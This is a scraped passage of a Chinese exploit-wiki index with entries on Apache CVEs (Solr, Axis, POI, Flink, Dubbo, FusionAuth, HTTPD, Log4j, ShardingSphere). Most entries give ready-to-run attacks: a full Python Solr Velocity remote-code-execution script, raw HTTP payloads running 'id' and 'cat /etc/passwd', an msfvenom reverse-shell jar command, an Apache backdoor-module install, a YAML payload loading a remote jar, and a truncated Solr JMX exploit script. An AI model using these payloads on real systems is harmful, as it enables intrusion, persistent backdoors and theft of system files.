command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport 执行docker-compose exec solr ls /tmp，可见/tmp/success已成功创建： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-20 17:02:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/2.html":{"url":"0day/Apache/2.html","title":"（CVE-2019-0227）Apache Axis 1.4远程代码执行","keywords":"","body":"（CVE-2019-0227）Apache Axis 1.4远程代码执行 一、漏洞简介 Apache Axis™是一个简单对象访问协议（SOAP）引擎。在最近的一次红队行动中，我们发现目标装有老版本的Apache Axis（1.4）。现在较新的有Apache Axis2, Apache CXF,和Metro等。尽管Apache Axis已经过时，但它仍然在许多情况下被使用，例如使用Axis构造的项目难以重写或者项目中含有使用SOAP编码的服务。 我们的目标仍在使用过时的版本，因此我们觉得值得深入挖掘，看看是否有可利用的漏洞。最后，我们找到了一个RCE漏洞，该漏洞是由于在默认的示例中使用了过期的硬编码域名作为默认安装。Apache官方为该漏洞签署编号：CVE-2019-0227。现在，我们已经购买了过期域名（www.xmltoday.com）从而防止该漏洞被恶意利用。在本文中，我们将在本地环境中（无需域名）为你演示这个漏洞，同时这个漏洞对Axis2也有影响。 Axis 如果你在服务器的Apache Axis或Axis2的找到服务端请求伪造（SSRF）漏洞，你也可能实现目标服务器的代码执行。在Ambionics Security的博客文章中有类似的介绍。因为涉及到产权保护，我不会介绍那篇文章的太多细节，总而言之：Axis以管理员权限处理localhost的请求，攻击者可以通过SSRF漏洞修改HTTP GET请求部分来伪装成localhost用户。 二、漏洞影响 Apache Axis版本= 1.4 三、复现过程 https://github.com/ianxtianxt/cve-2019-0227 1、需要在msf设置监听，另外需要修改代码24-30行处 ＃您需要更改这些变量以匹配您的配置 myip = “ 192.168.0.117 ” ＃您机器的IP target = “ 192.168.0.102 ” ＃目标IP 网关= “ 192.168.0.1 ” ＃默认网关 targetport = “ 8080 ” ＃目标运行轴的端口（可能是8080） pathtoaxis = “ http://192.168.0.102:8080/axis ” ＃这可以是自定义的视轴安装，但是这是默认 spoofinterface = “ eth0 ” ＃伪造的接口 jspwritepath = “ webapps \\\\ axis \\\\ exploit.jsp ” ＃在目标上写入JSP有效负载的相对路径这是Tomcat安装的默认路径 2、然后执行py文件 等待返回shell 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/3.html":{"url":"0day/Apache/3.html","title":"（CVE-2019-12415）Apache POI <= 4.1.0 XXE漏洞","keywords":"","body":"（CVE-2019-12415）Apache POI 一、漏洞简介 什么是POI Apache POI是Apache软件基金会的开放源码函式库，POI提供API给Java程序对Microsoft Office格式档案读和写的功能。 关于CVE-2019-12415 这是最近的POI官方宣布出来的一个XXE漏洞，可以影响到4.1.0版本，官方已在十天前更新了4.1.1版本，最新版本修复了这个XXE漏洞。 在最高4.1.0的Apache POI中，当使用工具XSSFExportToXml转换用户提供的Microsoft Excel文档时，特制文档可允许攻击者通过XML外部实体（XXE）从本地文件系统或内部网络资源中读取文件。加工中。 根据官方介绍，防御是在使用 XSSFExportToXml类xlsx转xml时触发的。 diff了一下4.1.0和4.1.1 XSSFExportToXml类的原始代码，发现在isValid方法里多设置了一个功能。 问题就出在 XSSFExportToXml#isValid 方法里，如果 XSSFExportToXml#exportToXML方法的第三个参数为true逐步进入 isValid触发XXE。 二、漏洞影响 Apache POI 三、复现过程 XSSFWorkbook wb = new XSSFWorkbook(new FileInputStream(new File(\"CustomXMLMappings.xlsx\"))); for (XSSFMap map : wb.getCustomXMLMappings()) { XSSFExportToXml exporter = new XSSFExportToXml(map); // 使用 XSSFExportToXml 将 xlsx 转成 xml exporter.exportToXML(System.out, true);//第一个参数是输出流无所谓，第二个参数要为 true} 然后下载这个xlsx文件。 https://github.com/apache/poi/raw/f509d1deae86866ed531f10f2eba7db17e098473/test-data/spreadsheet/CustomXMLMappings.xlsx 把文件替换为“ CustomXMLMappings.zip”并解压文件。 编辑 CustomXMLMappings/xl/xmlMaps.xml 文件。 在 标签里面加上一行代码。 然后把xlsx释放出来的所有文件再用zip打包回去，改成 CustomXMLMappings.xlsx。 最后一步监听本地8080端口，运行POC。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/4.html":{"url":"0day/Apache/4.html","title":"Apache后门维持","keywords":"","body":"Apache后门维持 一、漏洞简介 通过运行第三方脚本，实现维持后门的方法 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/apache- 1、上传 mod_backdoor.c到服务器，并执行命令 apxs -i -a -c mod_backdoor.c && service apache2 restart 2、控制端执行方法 python exploit.py 127.0.0.1 80 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/5.html":{"url":"0day/Apache/5.html","title":"Apache Solr Velocity模版注入远程命令执行","keywords":"","body":"Apache Solr Velocity模版注入远程命令执行 一、漏洞简介 该漏洞的产生是由于两方面的原因： 1、当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。 2、2Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。 当设置params.resource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。 二、漏洞影响 经过测试，目前影响Apache Solr 8.1.1到8.2.0版本。 推测影响全版本Apache Solr。 三、复现过程 手动检测 手动检测访问http://www.0-sec.org/8983/solr/#/进入主界面，单击左侧的Core Selector查看集合名称 1、post发送请求 POST /solr/test/config HTTP/1.1 Host: solr:8983 Content-Type: application/json Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } 2、执行系统命令 GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1 Host: localhost:8983 使用脚本检测 auth: @l3_W0ng version: 1.0 function: Apache Solr RCE via Velocity template usage: python3 script.py ip [port [command]] default port=8983 default command=whoami note: Step1: Init Apache Solr Configuration Step2: Remote Exec in Every Solr Node \"\"\" import sys import json import time import requests class initSolr(object): timestamp_s = str(time.time()).split('.') timestamp = timestamp_s[0] + timestamp_s[1][0:-3] def __init__(self, ip, port): self.ip = ip self.port = port def get_nodes(self): payload = { '_': self.timestamp, 'indexInfo': 'false', 'wt': 'json' } url = 'http://' + self.ip + ':' + self.port + '/solr/admin/cores' try: nodes_info = requests.get(url, params=payload, timeout=5) node = list(nodes_info.json()['status'].keys()) state = 1 except: node = '' state = 0 if node: return { 'node': node, 'state': state, 'msg': 'Get Nodes Successfully' } else: return { 'node': None, 'state': state, 'msg': 'Get Nodes Failed' } def get_system(self): payload = { '_': self.timestamp, 'wt': 'json' } url = 'http://' + self.ip + ':' + self.port + '/solr/admin/info/system' try: system_info = requests.get(url=url, params=payload, timeout=5) os_name = system_info.json()['system']['name'] os_uname = system_info.json()['system']['uname'] os_version = system_info.json()['system']['version'] state = 1 except: os_name = '' os_uname = '' os_version = '' state = 0 return { 'system': { 'name': os_name, 'uname': os_uname, 'version': os_version, 'state': state } } class apacheSolrRCE(object): def __init__(self, ip, port, node, command): self.ip = ip self.port = port self.node = node self.command = command self.url = \"http://\" + self.ip + ':' + self.port + '/solr/' + self.node def init_node_config(self): url = self.url + '/config' payload = { 'update-queryresponsewriter': { 'startup': 'lazy', 'name': 'velocity', 'class': 'solr.VelocityResponseWriter', 'template.base.dir': '', 'solr.resource.loader.enabled': 'true', 'params.resource.loader.enabled': 'true' } } try: res = requests.post(url=url, data=json.dumps(payload), timeout=5) if res.status_code == 200: return { 'init': 'Init node config successfully', 'state': 1 } else: return { 'init': 'Init node config failed', 'state': 0 } except: return { 'init': 'Init node config failed', 'state': 0 } def rce(self): url = self.url + (\"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=\" \"%23set($x=%27%27)+\" \"%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+\" \"%23set($chr=$x.class.forName(%27java.lang.Character%27))+\" \"%23set($str=$x.class.forName(%27java.lang.String%27))+\" \"%23set($ex=$rt.getRuntime().exec(%27\" + self.command + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+\" \"%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\") try: res = requests.get(url=url, timeout=5) if res.status_code == 200: try: if res.json()['responseHeader']['status'] == '0': return 'RCE failed @Apache Solr node %s\\n' % self.node else: return 'RCE failed @Apache Solr node %s\\n' % self.node except: return 'RCE Successfully @Apache Solr node %s\\n %s\\n' % (self.node, res.text.strip().strip('0')) else: return 'RCE failed @Apache Solr node %s\\n' % self.node except: return 'RCE failed @Apache Solr node %s\\n' % self.node def check(ip, port='8983', command='whoami'): system = initSolr(ip=ip, port=port) if system.get_nodes()['state'] == 0: print('No Nodes Found. Remote Exec Failed!') else: nodes = system.get_nodes()['node'] systeminfo = system.get_system() os_name = systeminfo['system']['name'] os_version = systeminfo['system']['version'] print('OS Realese: %s, OS Version: %s\\nif remote exec failed, ' 'you should change your command with right os platform\\n' % (os_name, os_version)) for node in nodes: res = apacheSolrRCE(ip=ip, port=port, node=node, command=command) init_node_config = res.init_node_config() if init_node_config['state'] == 1: print('Init node %s Successfully, exec command=%s' % (node, command)) result = res.rce() print(result) else: print('Init node %s Failed, Remote Exec Failed\\n' % node) if __name__ == '__main__': usage = ('python3 script.py ip [port [command]]\\n ' '\\t\\tdefault port=8983\\n ' '\\t\\tdefault command=whoami') if len(sys.argv) == 4: ip = sys.argv[1] port = sys.argv[2] command = sys.argv[3] check(ip=ip, port=port, command=command) elif len(sys.argv) == 3: ip = sys.argv[1] port = sys.argv[2] check(ip=ip, port=port) elif len(sys.argv) == 2: ip = sys.argv[1] check(ip=ip) else: print('Usage: %s:\\n' % usage) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/Apache Flink Dashboard 未授权访问-远程代码命令执行.html":{"url":"0day/Apache/Apache Flink Dashboard 未授权访问-远程代码命令执行.html","title":"Apache Flink Dashboard 未授权访问-远程代码命令执行","keywords":"","body":"Apache Flink Dashboard 未授权访问-远程代码命令执行 一、漏洞简介 Apache Flink的任意Jar包上传导致远程代码执行的漏洞 二、漏洞影响 三、复现过程 1、 msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.20.166 LPORT=8989 -f jar > rce.jar 2、 上传alewong Jar包 批量脚本 https://github.com/ianxtianxt/Apache-Flink-Dashboard-rec Ps: 当注释掉 if 'Unable to load requested file' in str(data): 之后，出现Token为空，或者 Unauthorized request 时候是不存在未授权访问的，而是带授权 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-13 12:19:31 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache Dubbo/CVE-2019-17564.html":{"url":"0day/Apache Dubbo/CVE-2019-17564.html","title":"（CVE-2019-17564）Apache Dubbo 反序列化漏洞","keywords":"","body":"（CVE-2019-17564）Apache Dubbo 反序列化漏洞 一、漏洞简介 Apache Dubbo支持多种协议，推荐官方使用Dubbo协议。Apache Dubbo HTTP协议中的一个反序列化漏洞（CVE-2019-17564），漏洞该主要原因的在于当Apache Dubbo启用HTTP协议之后，Apache Dubbo对消息体处理不当导致不安全反序列化，当项目包中存在可用的gadgets时即可导致远程代码执行。 二、漏洞影响 2.7.0 三、复现过程 1.环境建设 为了环境搭建方便，访问dubbo-samples的github项目主页（https://github.com/apache/dubbo-samples） 下载源码以后，分离出http部分 修改pom.xml中32行dubbo.version 修改其为漏洞版本,以2.7.3为例,随后在Idea中开启即可 修改JDK版本为1.8 随后导入一个可控的gadgets用于分析,例如commons-collections4-4.0,并启动HttpProvider 注:Dubbo启动依赖zookeeper,这部分使用不再赘述,请自行查阅google 2.漏洞分析 我们进入org.apache.dubbo.remoting.http.servlet.DispatcherServlet在43行handler.handle(request, response);处打入断点，利用burp进行发包跟踪它的走向 随后发现其进入org.apache.dubbo.rpc.protocol.http.HttpProtocol中的handle 进一步跟踪 最终进入org.springframework.remoting.rmi.RemoteInvocationSerializingExporter 该ois对象来源为报文中post data部分,对于传入的ois并没有做任何安全过滤和检查,直接就行了readObject方法导致RCE产生. 很多人不太理解Java反序列化漏洞怎么rce,这里给出一段示例代码 使用ysoserial随意生成一个序列化文件,再利用下面的代码读取该序列化文件即可达到效果,可见直接使用readObject方法的危害 import java.io.FileInputStream; import java.io.ObjectInputStream; public class test1 { public test1() { } public static void main(String[] args) throws Exception { FileInputStream fis = new FileInputStream(\"/Users/xue/Documents/NetSafe/Tools/JavaTools/1.ser\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); } } 3.漏洞复现 ysoserial下载地址：http://www.0-sec.org/download/ysoserial.zip 利用ysoserial生成payload java -jar ysoserial-master-30099844c6-1.jar CommonsCollections4 \"calc\" > payload.out 将payload粘贴至burp中 参考链接 https://qiita.com/shimizukawasaki/items/39c9695d439768cfaeb5 https://www.cnblogs.com/wh4am1/p/12307848.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-15 21:52:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache FusionAuth/CVE-2020-7799.html":{"url":"0day/Apache FusionAuth/CVE-2020-7799.html","title":"（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞","keywords":"","body":"（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞 一、漏洞简介 在FusionAuth 1.11.0版本之前的中发现了一个问题。经过身份验证的用户允许编辑电子邮件模板（主页->设置->电子邮件模板）或主题（主页->设置->主题），可利用freemarker.template.utility.Execute执行任意命令 二、漏洞影响 三、复现过程 post提交 POST /ajax/email/template/preview HTTP/1.1 Host: www.0-sec.org:9011 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: */* Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 796 DNT: 1 Connection: close Referer: http://192.168.0.3:9011/admin/email/template/edit/2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b Cookie: JSESSIONID=FA9DB3CBABA6B37E5336AE4B96001807; primeCSRFToken=kRC228UjAA4ohN_E9PW9kz0HpTlxUDCB_HVrDhBUfWU&emailTemplateId=2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b&emailTemplate.name=COPPA%20Notice&emailTemplate.defaultSubject=Notice%20of%20your%20consent&emailTemplate.fromEmail=no-reply%40fusionauth.io&emailTemplate.defaultFromName=FusionAuth&emailTemplate.defaultTextTemplate=You%20recently%20granted%20your%20child%20consent%20in%20our%20system.%20This%20email%20is%20to%20notify%20you%20of%20this%20consent.%20If%20you%20did%20not%20grant%20this%20consent%20or%20wish%20to%20revoke%20this%20consent%2C%20click%20the%20link%20below%3A%0A%0Ahttp%3A%2F%2Fexample.com%2Fconsent%2Fmanage%0A%0A-%20FusionAuth%20Admin&emailTemplate.defaultHtmlTemplate=${\"freemarker.template.utility.Execute\"?new()(\"cat /etc/passwd\")}} 批量检测脚本 https://github.com/ianxtianxt/CVE-2020-7799/ 参考链接 https://www.anquanke.com/vul/id/1910928 https://cert.360.cn/warning/detail?id=207275e27a6e7ee85a43a6eb5cf5fc69 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-19 20:34:52 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache HTTPD/Apache HTTPD 多后缀解析漏洞.html":{"url":"0day/Apache HTTPD/Apache HTTPD 多后缀解析漏洞.html","title":"Apache HTTPD 多后缀解析漏洞","keywords":"","body":"Apache HTTPD 多后缀解析漏洞 一、漏洞简介 Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件： AddType text/html .html AddLanguage zh-CN .cn 其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。 以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器： AddHandler application/x-httpd-php .php 那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 //说白了就是文件重命名为xxx.php.jpg就可以被识别成php文件 二、漏洞影响 三、复现过程 首先正常上传一个 xxx.php 文件 这里可以看到上传失败了。我们更改一下文件后缀名 将上传文件命名为 xxx.php.jpg 通过游览器访问上传的“jpg文件” 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-25 15:05:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache HTTPD/CVE-2017-15715.html":{"url":"0day/Apache HTTPD/CVE-2017-15715.html","title":"（CVE-2017-15715）Apache HTTPD 换行解析漏洞","keywords":"","body":"（CVE-2017-15715）Apache HTTPD 换行解析漏洞 一、漏洞简介 Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 二、漏洞影响 Apache HTTPD 2.4.0~2.4.29 三、复现过程 上传一个名为1.php的文件，被拦截： 在1.php后面插入一个\\x0A（注意，不能是\\x0D\\x0A，只能是一个\\x0A），不再拦截： 访问刚才上传的/1.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞： 参考链接 https://vulhub.org/#/environments/httpd/CVE-2017-15715/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-25 15:10:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache Log4j/CVE-2017-5645.html":{"url":"0day/Apache Log4j/CVE-2017-5645.html","title":"（CVE-2017-5645）Log4j 2.X反序列化漏洞","keywords":"","body":"（CVE-2017-5645）Log4j 2.X反序列化漏洞 一、漏洞简介 二、漏洞影响 Log4j 2.x 三、复现过程 漏洞分析 漏洞本质和上面是一样的，我们先创建如下 Demo 代码用于测试。 // src/main/java/Log4jSocketServer.java import org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge; import org.apache.logging.log4j.core.net.server.TcpSocketServer; import java.io.IOException; import java.io.ObjectInputStream; public class Log4jSocketServer { public static void main(String[] args){ TcpSocketServer myServer = null; try{ myServer = new TcpSocketServer(8888, new ObjectInputStreamLogEventBridge()); } catch(IOException e){ e.printStackTrace(); } myServer.run(); } } 4.0.0 org.example log4j-2.x-rce 1.0-SNAPSHOT org.apache.logging.log4j log4j-core 2.8.1 org.apache.logging.log4j log4j-api 2.8.1 commons-collections commons-collections 3.1 当我们运行代码后，程序会在本地的 8888 端口开始等待接收数据，然后在下图第105行代码处，将接收到的数据转换成 ObjectInputStream 对象数据，最终在 handler.start() 中调用 SocketHandler 类的 run 方法。 在 SocketHandler 类的 run 方法中， ObjectInputStream 对象数据被传入了 ObjectInputStreamLogEventBridge 类的 logEvents 方法，而反序列化就发生在这个方法中。 同样这里我们添加一条 commons-collections 的 Gadget 链用来演示命令执行。 参考链接 https://mochazz.github.io/2019/12/26/Log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 00:48:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache Log4j/CVE-2019-17571.html":{"url":"0day/Apache Log4j/CVE-2019-17571.html","title":"（CVE-2019-17571）Log4j 1.2.X反序列化漏洞","keywords":"","body":"（CVE-2019-17571）Log4j 1.2.X反序列化漏洞 一、漏洞简介 二、漏洞影响 Apache Log4j Apache Log4j的1.X版本官方在2015年8月已停止维护 三、复现过程 漏洞分析 其实这个漏洞非常简单，本质就是对从 socket 流中获取的数据没有进行过滤，而直接反序列化。如果当前环境中存在可利用的反序列化 Gadget 链，就可以达到命令执行等效果。我们可以创建如下 Demo 代码用于测试。 // src/SocketDeserializeDemo.java import org.apache.log4j.net.SimpleSocketServer; public class SocketDeserializeDemo { public static void main(String[] args){ System.out.println(\"INFO: Log4j Listening on port 8888\"); String[] arguments = {\"8888\", (new SocketDeserializeDemo()).getClass().getClassLoader().getResource(\"log4j.properties\").getPath()}; SimpleSocketServer.main(arguments); System.out.println(\"INFO: Log4j output successfuly.\"); } } # src/resources/log4j.properties log4j.rootCategory=DEBUG,stdout log4j.appender.stdout=org.apache.log4j.ConsoleAppender log4j.appender.stdout.layout=org.apache.log4j.PatternLayout log4j.appender.stdout.threshold=DEBUG log4j.appender.stdout.layout.ConversionPattern=[%d{yyy-MM-dd HH:mm:ss,SSS}]-[%p]-[MSG!:%m]-[%c\\:%L]%n 我们跟进 SimpleSocketServer 的 main 方法，发现其中调用了 SocketNode 类，具体代码如下。 如下图， SocketNode 类实现了 Runnable 接口，其构造方法从 socket 流中获取了数据，并将数据封装为一个 ObjectInputStream 对象。然后在其 run 方法中调用了 readObject 方法进行反序列化操作。由于这里没有对数据进行过滤，所以这里就出现了反序列化漏洞。 这里我们添加一条 commons-collections 的 Gadget 链用来演示命令执行。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 00:48:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache ShardingSphere/CVE-2020-1947.html":{"url":"0day/Apache ShardingSphere/CVE-2020-1947.html","title":"（CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞","keywords":"","body":"（CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞 一、漏洞简介 二、漏洞影响 Apache ShardingSphere 三、复现过程 Sharding-UI的默认密码为admin/admin 顺带一提，在conf/application.properties中存储了WEB端的端口和账号密码。 安装Zookeeper 要想成功利用，需要先在Sharding-UI中添加一个注册中心，否则在后续利用中会提示No activated registry center!，所以需要搭建一个Zookeeper。 这里直接使用docker搭建Zookeeper，并且将2181端口映射出来到本地的2181端口。 docker pull zookeeper docker run --privileged=true -d --name zookeeper --publish 2181:2181 -d zookeeper:latest 配置registry-center 在Sharding-UI的registry-center模块配置Zookeeper的地址。 成功连接即可。 生成payload 使用SnakeYAML反序列化小工具： https://github.com/ianxtianxt/yaml-payload 修改src/artsploit/AwesomeScriptEngineFactory.java文件，设置为弹出计算器。 编译生成jar包： javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . 然后使用python本地搭建HTTPServer，等待连接。 python -m SimpleHTTPServer 90 代码执行 在web端的Rule Config——>Add Schema处加入YAML代码并提交。 数据包正文： {\"name\":\"test\",\"ruleConfiguration\":\"encryptors:\\n :\\n type: MD5\\n props:\",\"dataSourceConfiguration\":\"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\\\"http://localhost:90/yaml-payload.jar\\\"]]]]\"} 发送即可成功弹出计算器。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-12 17:35:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache Solr/CVE-2019-0192.html":{"url":"0day/Apache Solr/CVE-2019-0192.html","title":"（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞","keywords":"","body":"（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞 一、漏洞简介 Apache Solr中的ConfigAPI允许设置一个jmx.serviceUrl，它将创建一个新的JMXConnectorServerFactory，并通过“绑定”操作触发对目标RMI/LDAP服务器的调用。恶意的RMI服务器可以响应任意的对象，这些对象将在Solr端使用java的ObjectInputStream反序列化，这被认为是不安全的。这种类型的漏洞可以利用ysoserial工具。根据目标类路径，攻击者可以使用其中一个“gadget chain”来触发Solr端上的远程代码执行。 二、漏洞影响 Apache Solr 5.0.0 to 5.5.5 Apache Solr 6.0.0 to 6.6.5 三、复现过程 下载Apache Solr 5.5.3版本作为靶机（注意，一定要使用jre7u25以下jre），执行solr -e techproducts -Dcom.sun.management.jmxremote指令开启服务。 使用ysoserial工具，执行Java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12363 Jdk7u21 \"calc\"指令，监听12363端口。然后传入以下数据： POST /solr/techproducts/config HTTP/1.1 Host: 0-sec.org:8983 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-type:application/json Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 91 {\"set-property\" : {\"jmx.serviceUrl\" : \"service:jmx:rmi:///jndi/rmi://127.0.0.1:12363/obj\"}} poc 下载yoserial,并将value修改为一下内容 remote = \"http://172.18.0.5:8983\" ressource = \"\" RHOST = \"172.18.0.1\" RPORT = \"1099\" 然后执行一下脚本 import base64 import requests import subprocess import signal import sys import os import time import re remote = \"http://172.18.0.5:8983\" ressource = \"\" RHOST = \"172.18.0.1\" RPORT = \"1099\" proxy = { } def exploit(command): print(\"\\n Run the malicious RMI server using yoserial by running this command:\") print(\"\\n java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21\" + command) if __name__ == \"__main__\": print(\"\\nCVE-2019-0192 - Apache Solr RCE 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5\\n\") print(\"[+] Checking if ressource available =>\", end=' ') burp0_url = remote + \"/solr/admin/cores?wt=json\" r = requests.get(burp0_url, proxies=proxy, verify=False, allow_redirects=False) if r.status_code == 200: if r.json()['status'] == \"\": print(\"KO\") sys.exit() else: a = list(r.json()['status'].keys()) ressource = \"/solr/\" + a[0] + \"/config\" print(ressource) else: print(\"KO\") sys.exit() while True: try: command = input(\"command (\\033[92mnot reflected\\033[0m)> \") if command == \"exit\": print(\"Exiting...\") break command = base64.b64encode(command.encode('utf-8')) command_str = command.decode('utf-8') command_str = command_str.replace('/', '+') pro = subprocess.Popen( \"java -cp ysoserial-master-ff59523eb6-1.jar ysoserial.exploit.JRMPListener \" + RPORT + \" Jdk7u21 'cp /etc/passwd /tmp/passwd'\", stdout=subprocess.PIPE,shell=True, preexec_fn=os.setsid) print(\"[+] Copy file to tmp directory =>\", end=' ') burp0_url = remote + ressource burp0_headers = {\"Content-Type\": \"application/json\"} burp0_json = { \"set-property\": {\"jmx.serviceUrl\": \"service:jmx:rmi:///jndi/rmi://\" + RHOST + \":\" + RPORT + \"/obj\"}} r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json) if r.status_code == 500: m = re.search('(undeclared checked exception; nested exception is)', r.text) if m: print(\"\\033[92mOK\\033[0m\") else: print(\"\\n[-] Error\") os.killpg(os.getpgid(pro.pid), signal.SIGTERM) sys.exit() else: 